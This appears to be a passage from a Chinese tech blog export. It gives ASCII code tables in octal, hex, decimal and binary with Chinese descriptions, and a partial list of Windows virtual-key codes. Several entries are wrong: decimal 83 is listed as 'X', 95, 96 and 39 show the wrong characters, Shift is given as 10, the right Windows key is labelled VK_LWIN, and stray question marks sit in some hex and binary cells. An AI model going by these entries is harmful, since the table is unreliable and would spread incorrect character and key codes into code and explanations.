<tr>
<td>14</td>
<td>0c</td>
<td>12</td>
<td>ff</td>
<td>114</td>
<td>4c</td>
<td>76</td>
<td>L</td>
</tr>
<tr>
<td>15</td>
<td>0d</td>
<td>13</td>
<td>er</td>
<td>115</td>
<td>4d</td>
<td>77</td>
<td>M</td>
</tr>
<tr>
<td>16</td>
<td>0e</td>
<td>14</td>
<td>so</td>
<td>116</td>
<td>4e</td>
<td>78</td>
<td>N</td>
</tr>
<tr>
<td>17</td>
<td>0f</td>
<td>15</td>
<td>si</td>
<td>117</td>
<td>4f</td>
<td>79</td>
<td>O</td>
</tr>
<tr>
<td>20</td>
<td>10</td>
<td>16</td>
<td>dle</td>
<td>120</td>
<td>50</td>
<td>80</td>
<td>P</td>
</tr>
<tr>
<td>21</td>
<td>11</td>
<td>17</td>
<td>dc1</td>
<td>121</td>
<td>51</td>
<td>81</td>
<td>Q</td>
</tr>
<tr>
<td>22</td>
<td>12</td>
<td>18</td>
<td>dc2</td>
<td>122</td>
<td>52</td>
<td>82</td>
<td>R</td>
</tr>
<tr>
<td>23</td>
<td>13</td>
<td>19</td>
<td>dc3</td>
<td>123</td>
<td>53</td>
<td>83</td>
<td>S</td>
</tr>
<tr>
<td>24</td>
<td>14</td>
<td>20</td>
<td>dc4</td>
<td>124</td>
<td>54</td>
<td>84</td>
<td>T</td>
</tr>
<tr>
<td>25</td>
<td>15</td>
<td>21</td>
<td>nak</td>
<td>125</td>
<td>55</td>
<td>85</td>
<td>U</td>
</tr>
<tr>
<td>26</td>
<td>16</td>
<td>22</td>
<td>syn</td>
<td>126</td>
<td>56</td>
<td>86</td>
<td>V</td>
</tr>
<tr>
<td>27</td>
<td>17</td>
<td>23</td>
<td>etb</td>
<td>127</td>
<td>57</td>
<td>87</td>
<td>W</td>
</tr>
<tr>
<td>30</td>
<td>18</td>
<td>24</td>
<td>can</td>
<td>130</td>
<td>58</td>
<td>88</td>
<td>X</td>
</tr>
<tr>
<td>31</td>
<td>19</td>
<td>25</td>
<td>em</td>
<td>131</td>
<td>59</td>
<td>89</td>
<td>Y</td>
</tr>
<tr>
<td>32</td>
<td>1a</td>
<td>26</td>
<td>sub</td>
<td>132</td>
<td>5a</td>
<td>90</td>
<td>Z</td>
</tr>
<tr>
<td>33</td>
<td>1b</td>
<td>27</td>
<td>esc</td>
<td>133</td>
<td>5b</td>
<td>91</td>
<td>[</td>
</tr>
<tr>
<td>34</td>
<td>1c</td>
<td>28</td>
<td>fs</td>
<td>134</td>
<td>5c</td>
<td>92</td>
<td>\</td>
</tr>
<tr>
<td>35</td>
<td>1d</td>
<td>29</td>
<td>gs</td>
<td>135</td>
<td>5d</td>
<td>93</td>
<td>]</td>
</tr>
<tr>
<td>36</td>
<td>1e</td>
<td>30</td>
<td>re</td>
<td>136</td>
<td>5e</td>
<td>94</td>
<td>^</td>
</tr>
<tr>
<td>37</td>
<td>1f</td>
<td>31</td>
<td>us</td>
<td>137</td>
<td>5f</td>
<td>95</td>
<td>_</td>
</tr>
<tr>
<td>40</td>
<td>20</td>
<td>32</td>
<td>sp</td>
<td>140</td>
<td>60</td>
<td>96</td>
<td>&#39;</td>
</tr>
<tr>
<td>41</td>
<td>21</td>
<td>33</td>
<td>!</td>
<td>141</td>
<td>61</td>
<td>97</td>
<td>a</td>
</tr>
<tr>
<td>42</td>
<td>22</td>
<td>34</td>
<td>&quot;</td>
<td>142</td>
<td>62</td>
<td>98</td>
<td>b</td>
</tr>
<tr>
<td>43</td>
<td>23</td>
<td>35</td>
<td>#</td>
<td>143</td>
<td>63</td>
<td>99</td>
<td>c</td>
</tr>
<tr>
<td>44</td>
<td>24</td>
<td>36</td>
<td>$</td>
<td>144</td>
<td>64</td>
<td>100</td>
<td>d</td>
</tr>
<tr>
<td>45</td>
<td>25</td>
<td>37</td>
<td>%</td>
<td>145</td>
<td>65</td>
<td>101</td>
<td>e</td>
</tr>
<tr>
<td>46</td>
<td>26</td>
<td>38</td>
<td>&amp;</td>
<td>146</td>
<td>66</td>
<td>102</td>
<td>f</td>
</tr>
<tr>
<td>47</td>
<td>27</td>
<td>39</td>
<td>`</td>
<td>147</td>
<td>67</td>
<td>103</td>
<td>g</td>
</tr>
<tr>
<td>50</td>
<td>28</td>
<td>40</td>
<td>(</td>
<td>150</td>
<td>68</td>
<td>104</td>
<td>h</td>
</tr>
<tr>
<td>51</td>
<td>29</td>
<td>41</td>
<td>)</td>
<td>151</td>
<td>69</td>
<td>105</td>
<td>i</td>
</tr>
<tr>
<td>52</td>
<td>2a</td>
<td>42</td>
<td>*</td>
<td>152</td>
<td>6a</td>
<td>106</td>
<td>j</td>
</tr>
<tr>
<td>53</td>
<td>2b</td>
<td>43</td>
<td>+</td>
<td>153</td>
<td>6b</td>
<td>107</td>
<td>k</td>
</tr>
<tr>
<td>54</td>
<td>2c</td>
<td>44</td>
<td>,</td>
<td>154</td>
<td>6c</td>
<td>108</td>
<td>l</td>
</tr>
<tr>
<td>55</td>
<td>2d</td>
<td>45</td>
<td>-</td>
<td>155</td>
<td>6d</td>
<td>109</td>
<td>m</td>
</tr>
<tr>
<td>56</td>
<td>2e</td>
<td>46</td>
<td>.</td>
<td>156</td>
<td>6e</td>
<td>110</td>
<td>n</td>
</tr>
<tr>
<td>57</td>
<td>2f</td>
<td>47</td>
<td>&#x2F;</td>
<td>157</td>
<td>6f</td>
<td>111</td>
<td>o</td>
</tr>
<tr>
<td>60</td>
<td>30</td>
<td>48</td>
<td>0</td>
<td>160</td>
<td>70</td>
<td>112</td>
<td>p</td>
</tr>
<tr>
<td>61</td>
<td>31</td>
<td>49</td>
<td>1</td>
<td>161</td>
<td>71</td>
<td>113</td>
<td>q</td>
</tr>
<tr>
<td>62</td>
<td>32</td>
<td>50</td>
<td>2</td>
<td>162</td>
<td>72</td>
<td>114</td>
<td>r</td>
</tr>
<tr>
<td>63</td>
<td>33</td>
<td>51</td>
<td>3</td>
<td>163</td>
<td>73</td>
<td>115</td>
<td>s</td>
</tr>
<tr>
<td>64</td>
<td>34</td>
<td>52</td>
<td>4</td>
<td>164</td>
<td>74</td>
<td>116</td>
<td>t</td>
</tr>
<tr>
<td>65</td>
<td>35</td>
<td>53</td>
<td>5</td>
<td>165</td>
<td>75</td>
<td>117</td>
<td>u</td>
</tr>
<tr>
<td>66</td>
<td>36</td>
<td>54</td>
<td>6</td>
<td>166</td>
<td>76</td>
<td>118</td>
<td>v</td>
</tr>
<tr>
<td>67</td>
<td>37</td>
<td>55</td>
<td>7</td>
<td>167</td>
<td>77</td>
<td>119</td>
<td>w</td>
</tr>
<tr>
<td>70</td>
<td>38</td>
<td>56</td>
<td>8</td>
<td>170</td>
<td>78</td>
<td>120</td>
<td>x</td>
</tr>
<tr>
<td>71</td>
<td>39</td>
<td>57</td>
<td>9</td>
<td>171</td>
<td>79</td>
<td>121</td>
<td>y</td>
</tr>
<tr>
<td>72</td>
<td>3a</td>
<td>58</td>
<td>:</td>
<td>172</td>
<td>7a</td>
<td>122</td>
<td>z</td>
</tr>
<tr>
<td>73</td>
<td>3b</td>
<td>59</td>
<td>;</td>
<td>173</td>
<td>7b</td>
<td>123</td>
<td>{</td>
</tr>
<tr>
<td>74</td>
<td>3c</td>
<td>60</td>
<td>&lt;</td>
<td>174</td>
<td>7c</td>
<td>124</td>
<td>|</td>
</tr>
<tr>
<td>75</td>
<td>3d</td>
<td>61</td>
<td>&#x3D;</td>
<td>175</td>
<td>7d</td>
<td>125</td>
<td>}</td>
</tr>
<tr>
<td>76</td>
<td>3e</td>
<td>62</td>
<td>&gt;</td>
<td>176</td>
<td>7e</td>
<td>126</td>
<td>~</td>
</tr>
<tr>
<td>77</td>
<td>3f</td>
<td>63</td>
<td>?</td>
<td>177</td>
<td>7f</td>
<td>127</td>
<td>del</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>基础</category>
        <category>字符集</category>
      </categories>
      <tags>
        <tag>字符集</tag>
      </tags>
  </entry>
  <entry>
    <title>ASCII码表相关</title>
    <url>/blog/basetech/charset/ascii10/</url>
    <content><![CDATA[<h2 id="十进制ASCII码表"><a href="#十进制ASCII码表" class="headerlink" title="十进制ASCII码表"></a>十进制ASCII码表</h2><table>
<thead>
<tr>
<th>ASCII值</th>
<th>控制字符</th>
<th>ASCII值</th>
<th>控制字符</th>
<th>ASCII值</th>
<th>控制字符</th>
<th>ASCII值</th>
<th>控制字符</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>NUT</td>
<td>32</td>
<td>(space)</td>
<td>64</td>
<td>@</td>
<td>96</td>
<td>、</td>
</tr>
<tr>
<td>1</td>
<td>SOH</td>
<td>33</td>
<td>！</td>
<td>65</td>
<td>A</td>
<td>97</td>
<td>a</td>
</tr>
<tr>
<td>2</td>
<td>STX</td>
<td>34</td>
<td>“</td>
<td>66</td>
<td>B</td>
<td>98</td>
<td>b</td>
</tr>
<tr>
<td>3</td>
<td>ETX</td>
<td>35</td>
<td>#</td>
<td>67</td>
<td>C</td>
<td>99</td>
<td>c</td>
</tr>
<tr>
<td>4</td>
<td>EOT</td>
<td>36</td>
<td>$</td>
<td>68</td>
<td>D</td>
<td>100</td>
<td>d</td>
</tr>
<tr>
<td>5</td>
<td>ENQ</td>
<td>37</td>
<td>%</td>
<td>69</td>
<td>E</td>
<td>101</td>
<td>e</td>
</tr>
<tr>
<td>6</td>
<td>ACK</td>
<td>38</td>
<td>&amp;</td>
<td>70</td>
<td>F</td>
<td>102</td>
<td>f</td>
</tr>
<tr>
<td>7</td>
<td>BEL</td>
<td>39</td>
<td>,</td>
<td>71</td>
<td>G</td>
<td>103</td>
<td>g</td>
</tr>
<tr>
<td>8</td>
<td>BS</td>
<td>40</td>
<td>(</td>
<td>72</td>
<td>H</td>
<td>104</td>
<td>h</td>
</tr>
<tr>
<td>9</td>
<td>HT</td>
<td>41</td>
<td>)</td>
<td>73</td>
<td>I</td>
<td>105</td>
<td>i</td>
</tr>
<tr>
<td>10</td>
<td>LF</td>
<td>42</td>
<td>*</td>
<td>74</td>
<td>J</td>
<td>106</td>
<td>j</td>
</tr>
<tr>
<td>11</td>
<td>VT</td>
<td>43</td>
<td>+</td>
<td>75</td>
<td>K</td>
<td>107</td>
<td>k</td>
</tr>
<tr>
<td>12</td>
<td>FF</td>
<td>44</td>
<td>,</td>
<td>76</td>
<td>L</td>
<td>108</td>
<td>l</td>
</tr>
<tr>
<td>13</td>
<td>CR</td>
<td>45</td>
<td>-</td>
<td>77</td>
<td>M</td>
<td>109</td>
<td>m</td>
</tr>
<tr>
<td>14</td>
<td>SO</td>
<td>46</td>
<td>.</td>
<td>78</td>
<td>N</td>
<td>110</td>
<td>n</td>
</tr>
<tr>
<td>15</td>
<td>SI</td>
<td>47</td>
<td>&#x2F;</td>
<td>79</td>
<td>O</td>
<td>111</td>
<td>o</td>
</tr>
<tr>
<td>16</td>
<td>DLE</td>
<td>48</td>
<td>0</td>
<td>80</td>
<td>P</td>
<td>112</td>
<td>p</td>
</tr>
<tr>
<td>17</td>
<td>DCI</td>
<td>49</td>
<td>1</td>
<td>81</td>
<td>Q</td>
<td>113</td>
<td>q</td>
</tr>
<tr>
<td>18</td>
<td>DC2</td>
<td>50</td>
<td>2</td>
<td>82</td>
<td>R</td>
<td>114</td>
<td>r</td>
</tr>
<tr>
<td>19</td>
<td>DC3</td>
<td>51</td>
<td>3</td>
<td>83</td>
<td>X</td>
<td>115</td>
<td>s</td>
</tr>
<tr>
<td>20</td>
<td>DC4</td>
<td>52</td>
<td>4</td>
<td>84</td>
<td>T</td>
<td>116</td>
<td>t</td>
</tr>
<tr>
<td>21</td>
<td>NAK</td>
<td>53</td>
<td>5</td>
<td>85</td>
<td>U</td>
<td>117</td>
<td>u</td>
</tr>
<tr>
<td>22</td>
<td>SYN</td>
<td>54</td>
<td>6</td>
<td>86</td>
<td>V</td>
<td>118</td>
<td>v</td>
</tr>
<tr>
<td>23</td>
<td>TB</td>
<td>55</td>
<td>7</td>
<td>87</td>
<td>W</td>
<td>119</td>
<td>w</td>
</tr>
<tr>
<td>24</td>
<td>CAN</td>
<td>56</td>
<td>8</td>
<td>88</td>
<td>X</td>
<td>120</td>
<td>x</td>
</tr>
<tr>
<td>25</td>
<td>EM</td>
<td>57</td>
<td>9</td>
<td>89</td>
<td>Y</td>
<td>121</td>
<td>y</td>
</tr>
<tr>
<td>26</td>
<td>SUB</td>
<td>58</td>
<td>:</td>
<td>90</td>
<td>Z</td>
<td>122</td>
<td>z</td>
</tr>
<tr>
<td>27</td>
<td>ESC</td>
<td>59</td>
<td>;</td>
<td>91</td>
<td>[</td>
<td>123</td>
<td>{</td>
</tr>
<tr>
<td>28</td>
<td>FS</td>
<td>60</td>
<td>&lt;</td>
<td>92</td>
<td>\</td>
<td>124</td>
<td>|</td>
</tr>
<tr>
<td>29</td>
<td>GS</td>
<td>61</td>
<td>&#x3D;</td>
<td>93</td>
<td>]</td>
<td>125</td>
<td>}</td>
</tr>
<tr>
<td>30</td>
<td>RS</td>
<td>62</td>
<td>&gt;</td>
<td>94</td>
<td>^</td>
<td>126</td>
<td>~</td>
</tr>
<tr>
<td>31</td>
<td>US</td>
<td>63</td>
<td>?</td>
<td>95</td>
<td>—</td>
<td>127</td>
<td>DEL</td>
</tr>
</tbody></table>
<h2 id="ASCII中英文对照表"><a href="#ASCII中英文对照表" class="headerlink" title="ASCII中英文对照表"></a>ASCII中英文对照表</h2><table>
<thead>
<tr>
<th>二进制</th>
<th>十进制</th>
<th>十六进制</th>
<th>缩写&#x2F;全称</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>00000000</td>
<td>0</td>
<td>00</td>
<td>NUL(null)</td>
<td>空字符</td>
</tr>
<tr>
<td>00000001</td>
<td>1</td>
<td>01</td>
<td>SOH(start of handing)</td>
<td>标题开始</td>
</tr>
<tr>
<td>00000010</td>
<td>2</td>
<td>02</td>
<td>STX(start of text)</td>
<td>正文开始</td>
</tr>
<tr>
<td>00000011</td>
<td>3</td>
<td>03</td>
<td>ETX(end of text)</td>
<td>正文结束</td>
</tr>
<tr>
<td>00000100</td>
<td>4</td>
<td>04</td>
<td>EOT(end of transmission)</td>
<td>传输结束</td>
</tr>
<tr>
<td>00000101</td>
<td>5</td>
<td>05</td>
<td>ENQ(enquiry)</td>
<td>请求</td>
</tr>
<tr>
<td>00000110</td>
<td>6</td>
<td>06</td>
<td>ACK(acknowledge)</td>
<td>收到通知</td>
</tr>
<tr>
<td>00000111</td>
<td>7</td>
<td>07</td>
<td>BEL(bell)</td>
<td>响铃</td>
</tr>
<tr>
<td>00001000</td>
<td>8</td>
<td>08</td>
<td>BS(backspace)</td>
<td>退格</td>
</tr>
<tr>
<td>00001001</td>
<td>9</td>
<td>09</td>
<td>HT(horizontal tab)</td>
<td>水平制表符</td>
</tr>
<tr>
<td>00001010</td>
<td>10</td>
<td>0A</td>
<td>LF(NL line feed, newline)</td>
<td>换行键</td>
</tr>
<tr>
<td>00001011</td>
<td>11</td>
<td>0B</td>
<td>VT(vertical tab)</td>
<td>垂直制表符</td>
</tr>
<tr>
<td>00001100</td>
<td>12</td>
<td>0C</td>
<td>FF(NP form feed, newpage)</td>
<td>换页键</td>
</tr>
<tr>
<td>00001101</td>
<td>13</td>
<td>0D</td>
<td>CR(carriagereturn)</td>
<td>回车键</td>
</tr>
<tr>
<td>00001110</td>
<td>14</td>
<td>0E</td>
<td>SO(shift out)</td>
<td>不用切换</td>
</tr>
<tr>
<td>00001111</td>
<td>15</td>
<td>0F</td>
<td>SI(shift in)</td>
<td>启用切换</td>
</tr>
<tr>
<td>00010000</td>
<td>16</td>
<td>10</td>
<td>DLE(data link escape)</td>
<td>数据链路转义</td>
</tr>
<tr>
<td>00010001</td>
<td>17</td>
<td>11</td>
<td>DC1(device control 1)</td>
<td>设备控制1</td>
</tr>
<tr>
<td>00010010</td>
<td>18</td>
<td>12</td>
<td>DC2(device control 2)</td>
<td>设备控制2</td>
</tr>
<tr>
<td>00010011</td>
<td>19</td>
<td>13</td>
<td>DC3(device control 3)</td>
<td>设备控制3</td>
</tr>
<tr>
<td>00010100</td>
<td>20</td>
<td>14</td>
<td>DC4(device control 4)</td>
<td>设备控制4</td>
</tr>
<tr>
<td>00010101</td>
<td>21</td>
<td>15</td>
<td>NAK(negative acknowledge)</td>
<td>拒绝接收</td>
</tr>
<tr>
<td>00010110</td>
<td>22</td>
<td>16</td>
<td>SYN(synchronous idle)</td>
<td>同步空闲</td>
</tr>
<tr>
<td>00010111</td>
<td>23</td>
<td>17</td>
<td>ETB(endof trans. block)</td>
<td>传输块结束</td>
</tr>
<tr>
<td>00011000</td>
<td>24</td>
<td>18</td>
<td>CAN(cancel)</td>
<td>取消</td>
</tr>
<tr>
<td>00011001</td>
<td>25</td>
<td>19</td>
<td>EM(end of medium)</td>
<td>介质中断</td>
</tr>
<tr>
<td>00011010</td>
<td>26</td>
<td>1A</td>
<td>SUB(substitute)</td>
<td>替补</td>
</tr>
<tr>
<td>00011011</td>
<td>27</td>
<td>1B</td>
<td>ESC(escape)</td>
<td>溢出</td>
</tr>
<tr>
<td>00011100</td>
<td>28</td>
<td>1C</td>
<td>FS (file separator)</td>
<td>文件分割符</td>
</tr>
<tr>
<td>00011101</td>
<td>29</td>
<td>1D</td>
<td>GS(group separator)</td>
<td>分组符</td>
</tr>
<tr>
<td>00011110</td>
<td>30</td>
<td>1E</td>
<td>RS(record separator)</td>
<td>记录分离符</td>
</tr>
<tr>
<td>00011111</td>
<td>31</td>
<td>1F</td>
<td>US(unit separator)</td>
<td>单元分隔符</td>
</tr>
<tr>
<td>00100000</td>
<td>32</td>
<td>20</td>
<td>空格</td>
<td></td>
</tr>
<tr>
<td>00100001</td>
<td>33</td>
<td>21</td>
<td>!</td>
<td></td>
</tr>
<tr>
<td>00100010</td>
<td>34</td>
<td>22</td>
<td>&quot;</td>
<td></td>
</tr>
<tr>
<td>00100011</td>
<td>35</td>
<td>23</td>
<td>#</td>
<td></td>
</tr>
<tr>
<td>00100100</td>
<td>36</td>
<td>24</td>
<td>$</td>
<td></td>
</tr>
<tr>
<td>00100101</td>
<td>37</td>
<td>25</td>
<td>%</td>
<td></td>
</tr>
<tr>
<td>00100110</td>
<td>38</td>
<td>26</td>
<td>&amp;</td>
<td></td>
</tr>
<tr>
<td>00100111</td>
<td>39</td>
<td>27</td>
<td>&#39;</td>
<td></td>
</tr>
<tr>
<td>00101000</td>
<td>40</td>
<td>28</td>
<td>(</td>
<td></td>
</tr>
<tr>
<td>00101001</td>
<td>41</td>
<td>29</td>
<td>)</td>
<td></td>
</tr>
<tr>
<td>00101010</td>
<td>42</td>
<td>2A</td>
<td>*</td>
<td></td>
</tr>
<tr>
<td>00101011</td>
<td>43</td>
<td>2B</td>
<td>+</td>
<td></td>
</tr>
<tr>
<td>00101100</td>
<td>44</td>
<td>2C</td>
<td>,</td>
<td></td>
</tr>
<tr>
<td>00101101</td>
<td>45</td>
<td>2D</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>00101110</td>
<td>46</td>
<td>2E</td>
<td>.</td>
<td></td>
</tr>
<tr>
<td>00101111</td>
<td>47</td>
<td>2F</td>
<td>&#x2F;</td>
<td></td>
</tr>
<tr>
<td>00110000</td>
<td>48</td>
<td>30</td>
<td>0</td>
<td></td>
</tr>
<tr>
<td>00110001</td>
<td>49</td>
<td>31</td>
<td>1</td>
<td></td>
</tr>
<tr>
<td>00110010</td>
<td>50</td>
<td>32</td>
<td>2</td>
<td></td>
</tr>
<tr>
<td>00110011</td>
<td>51</td>
<td>33</td>
<td>3</td>
<td></td>
</tr>
<tr>
<td>00110100</td>
<td>52</td>
<td>34</td>
<td>4</td>
<td></td>
</tr>
<tr>
<td>00110101</td>
<td>53</td>
<td>35</td>
<td>5</td>
<td></td>
</tr>
<tr>
<td>00110110</td>
<td>54</td>
<td>36</td>
<td>6</td>
<td></td>
</tr>
<tr>
<td>00110111</td>
<td>55</td>
<td>37</td>
<td>7</td>
<td></td>
</tr>
<tr>
<td>00111000</td>
<td>56</td>
<td>38</td>
<td>8</td>
<td></td>
</tr>
<tr>
<td>00111001</td>
<td>57</td>
<td>39</td>
<td>9</td>
<td></td>
</tr>
<tr>
<td>00111010</td>
<td>58</td>
<td>3A</td>
<td>:</td>
<td></td>
</tr>
<tr>
<td>00111011</td>
<td>59</td>
<td>3B</td>
<td>;</td>
<td></td>
</tr>
<tr>
<td>00111100</td>
<td>60</td>
<td>3C</td>
<td>&lt;</td>
<td></td>
</tr>
<tr>
<td>00111101</td>
<td>61</td>
<td>3D</td>
<td>&#x3D;</td>
<td></td>
</tr>
<tr>
<td>00111110</td>
<td>62</td>
<td>3E</td>
<td>&gt;</td>
<td></td>
</tr>
<tr>
<td>00111111</td>
<td>63</td>
<td>3F</td>
<td>?</td>
<td></td>
</tr>
<tr>
<td>01000000</td>
<td>64</td>
<td>40</td>
<td>@</td>
<td></td>
</tr>
<tr>
<td>01000001</td>
<td>65</td>
<td>41</td>
<td>A</td>
<td></td>
</tr>
<tr>
<td>01000010</td>
<td>66</td>
<td>42</td>
<td>B</td>
<td></td>
</tr>
<tr>
<td>01000011</td>
<td>67</td>
<td>43</td>
<td>C</td>
<td></td>
</tr>
<tr>
<td>01000100</td>
<td>68</td>
<td>44</td>
<td>D</td>
<td></td>
</tr>
<tr>
<td>01000101</td>
<td>69</td>
<td>45</td>
<td>E</td>
<td></td>
</tr>
<tr>
<td>01000110</td>
<td>70</td>
<td>46</td>
<td>F</td>
<td></td>
</tr>
<tr>
<td>01000111</td>
<td>71</td>
<td>47</td>
<td>G</td>
<td></td>
</tr>
<tr>
<td>01001000</td>
<td>72</td>
<td>48</td>
<td>H</td>
<td></td>
</tr>
<tr>
<td>01001001</td>
<td>73</td>
<td>49?</td>
<td>I</td>
<td></td>
</tr>
<tr>
<td>01001010</td>
<td>74</td>
<td>4A</td>
<td>J</td>
<td></td>
</tr>
<tr>
<td>01001011</td>
<td>75</td>
<td>4B</td>
<td>K</td>
<td></td>
</tr>
<tr>
<td>01001100</td>
<td>76</td>
<td>4C</td>
<td>L</td>
<td></td>
</tr>
<tr>
<td>01001101</td>
<td>77</td>
<td>4D</td>
<td>M</td>
<td></td>
</tr>
<tr>
<td>01001110</td>
<td>78</td>
<td>4E</td>
<td>N</td>
<td></td>
</tr>
<tr>
<td>01001111</td>
<td>79</td>
<td>4F</td>
<td>O</td>
<td></td>
</tr>
<tr>
<td>01010000</td>
<td>80</td>
<td>50</td>
<td>P</td>
<td></td>
</tr>
<tr>
<td>01010001</td>
<td>81</td>
<td>51</td>
<td>Q</td>
<td></td>
</tr>
<tr>
<td>01010010</td>
<td>82</td>
<td>52</td>
<td>R</td>
<td></td>
</tr>
<tr>
<td>01010011</td>
<td>83</td>
<td>53</td>
<td>S</td>
<td></td>
</tr>
<tr>
<td>01010100</td>
<td>84</td>
<td>54</td>
<td>T</td>
<td></td>
</tr>
<tr>
<td>01010101</td>
<td>85</td>
<td>55</td>
<td>U</td>
<td></td>
</tr>
<tr>
<td>01010110</td>
<td>86</td>
<td>56</td>
<td>V</td>
<td></td>
</tr>
<tr>
<td>01010111</td>
<td>87</td>
<td>57</td>
<td>W</td>
<td></td>
</tr>
<tr>
<td>01011000</td>
<td>88</td>
<td>58?</td>
<td>X</td>
<td></td>
</tr>
<tr>
<td>01011001</td>
<td>89</td>
<td>59</td>
<td>Y</td>
<td></td>
</tr>
<tr>
<td>01011010</td>
<td>90</td>
<td>5A</td>
<td>Z</td>
<td></td>
</tr>
<tr>
<td>01011011</td>
<td>91</td>
<td>5B</td>
<td>[</td>
<td></td>
</tr>
<tr>
<td>01011100</td>
<td>92</td>
<td>5C</td>
<td>\</td>
<td></td>
</tr>
<tr>
<td>01011101</td>
<td>93</td>
<td>5D</td>
<td>]</td>
<td></td>
</tr>
<tr>
<td>01011110</td>
<td>94</td>
<td>5E</td>
<td>^</td>
<td></td>
</tr>
<tr>
<td>01011111</td>
<td>95</td>
<td>5F</td>
<td>_</td>
<td></td>
</tr>
<tr>
<td>01100000</td>
<td>96</td>
<td>60</td>
<td>`</td>
<td></td>
</tr>
<tr>
<td>01100001</td>
<td>97</td>
<td>61</td>
<td>a</td>
<td></td>
</tr>
<tr>
<td>01100010</td>
<td>98</td>
<td>62</td>
<td>b</td>
<td></td>
</tr>
<tr>
<td>01100011</td>
<td>99</td>
<td>63</td>
<td>c</td>
<td></td>
</tr>
<tr>
<td>01100100</td>
<td>100</td>
<td>64</td>
<td>d</td>
<td></td>
</tr>
<tr>
<td>01100101</td>
<td>101</td>
<td>65</td>
<td>e</td>
<td></td>
</tr>
<tr>
<td>01100110</td>
<td>102</td>
<td>66</td>
<td>f</td>
<td></td>
</tr>
<tr>
<td>01100111</td>
<td>103</td>
<td>67</td>
<td>g</td>
<td></td>
</tr>
<tr>
<td>01101000</td>
<td>104</td>
<td>68</td>
<td>h</td>
<td></td>
</tr>
<tr>
<td>01101001</td>
<td>105</td>
<td>69</td>
<td>i</td>
<td></td>
</tr>
<tr>
<td>01101010</td>
<td>106</td>
<td>6A</td>
<td>j</td>
<td></td>
</tr>
<tr>
<td>01101011</td>
<td>107</td>
<td>6B</td>
<td>k</td>
<td></td>
</tr>
<tr>
<td>01101100</td>
<td>108</td>
<td>6C</td>
<td>l</td>
<td></td>
</tr>
<tr>
<td>01101101</td>
<td>109</td>
<td>6D</td>
<td>m</td>
<td></td>
</tr>
<tr>
<td>01101110</td>
<td>110</td>
<td>6E</td>
<td>n</td>
<td></td>
</tr>
<tr>
<td>01101111</td>
<td>111</td>
<td>6F</td>
<td>o</td>
<td></td>
</tr>
<tr>
<td>01110000</td>
<td>112</td>
<td>70</td>
<td>p</td>
<td></td>
</tr>
<tr>
<td>01110001</td>
<td>113</td>
<td>71</td>
<td>q</td>
<td></td>
</tr>
<tr>
<td>01110010</td>
<td>114</td>
<td>72</td>
<td>r</td>
<td></td>
</tr>
<tr>
<td>01110011</td>
<td>115</td>
<td>73</td>
<td>s</td>
<td></td>
</tr>
<tr>
<td>01110100</td>
<td>116</td>
<td>74</td>
<td>t</td>
<td></td>
</tr>
<tr>
<td>01110101</td>
<td>117</td>
<td>75</td>
<td>u</td>
<td></td>
</tr>
<tr>
<td>01110110</td>
<td>118</td>
<td>76</td>
<td>v</td>
<td></td>
</tr>
<tr>
<td>01110111?</td>
<td>119</td>
<td>77</td>
<td>w</td>
<td></td>
</tr>
<tr>
<td>01111000</td>
<td>120</td>
<td>78</td>
<td>x</td>
<td></td>
</tr>
<tr>
<td>01111001</td>
<td>121</td>
<td>79</td>
<td>y</td>
<td></td>
</tr>
<tr>
<td>01111010</td>
<td>122</td>
<td>7A</td>
<td>z</td>
<td></td>
</tr>
<tr>
<td>01111011</td>
<td>123</td>
<td>7B</td>
<td>{</td>
<td></td>
</tr>
<tr>
<td>01111100</td>
<td>124</td>
<td>7C</td>
<td>|</td>
<td></td>
</tr>
<tr>
<td>01111101</td>
<td>125</td>
<td>7D</td>
<td>}</td>
<td></td>
</tr>
<tr>
<td>01111110</td>
<td>126</td>
<td>7E</td>
<td>~</td>
<td></td>
</tr>
<tr>
<td>01111111</td>
<td>127</td>
<td>7F</td>
<td>DEL</td>
<td></td>
</tr>
</tbody></table>
<h2 id="键盘常用ASCII码"><a href="#键盘常用ASCII码" class="headerlink" title="键盘常用ASCII码"></a>键盘常用ASCII码</h2><table>
<thead>
<tr>
<th>键值名称</th>
<th>定义</th>
<th>键值</th>
</tr>
</thead>
<tbody><tr>
<td>ESC键</td>
<td>VK_ESCAPE</td>
<td>27</td>
</tr>
<tr>
<td>回车键</td>
<td>VK_RETURN</td>
<td>13</td>
</tr>
<tr>
<td>TAB键</td>
<td>VK_TAB</td>
<td>9</td>
</tr>
<tr>
<td>Caps Lock键</td>
<td>VK_CAPITAL</td>
<td>20</td>
</tr>
<tr>
<td>Shift键</td>
<td>VK_SHIFT</td>
<td>10</td>
</tr>
<tr>
<td>Ctrl键</td>
<td>VK_CONTROL</td>
<td>17</td>
</tr>
<tr>
<td>Alt键</td>
<td>VK_MENU</td>
<td>18</td>
</tr>
<tr>
<td>空格键</td>
<td>VK_SPACE</td>
<td>32</td>
</tr>
<tr>
<td>退格键</td>
<td>VK_BACK</td>
<td>8</td>
</tr>
<tr>
<td>左徽标键</td>
<td>VK_LWIN</td>
<td>91</td>
</tr>
<tr>
<td>右徽标键</td>
<td>VK_LWIN</td>
<td>92</td>
</tr>
<tr>
<td>鼠标右键快捷键</td>
<td>VK_APPS</td>
<td>93</td>
</tr>
<tr>
<td>Insert键</td>
<td>VK_INSERT</td>
<td>45</td>
</tr>
<tr>
<td>Home键</td>
<td>VK_HOME</td>
<td>36</td>
</tr>
<tr>
<td>Page Up</td>
<td>VK_PRIOR</td>
<td>33</td>
</tr>
<tr>
<td>PageDown</td>
<td>VK_NEXT</td>
<td>34</td>
</tr>
<tr>
<td>End键</td>
<td>VK_END</td>
<td>35</td>
</tr>
<tr>
<td>Delete键</td>
<td>VK_DELETE</td>
<td>46</td>
</tr>
<tr>
<td>方向键(←)</td>
<td>VK_LEFT</td>
<td>37</td>
</tr>
<tr>
<td>方向键(↑)</td>
<td>VK_UP</td>
<td>38</td>
</tr>
<tr>
<td>方向键(→)</td>
<td>VK_RIGHT</td>
<td>39</td>
</tr>
<tr>
<td>方向键(↓)</td>
<td>VK_DOWN</td>
<td>40</td>
</tr>
<tr>
<td>F1键</td>
<td>VK_F1</td>
<td>112</td>
</tr>
<tr>
<td>F2键</td>
<td>VK_F2</td>
<td>113</td>
</tr>
<tr>
<td>F3键</td>
<td>VK_F3</td>
<td>114</td>
</tr>
<tr>
<td>F4键</td>
<td>VK_F4</td>
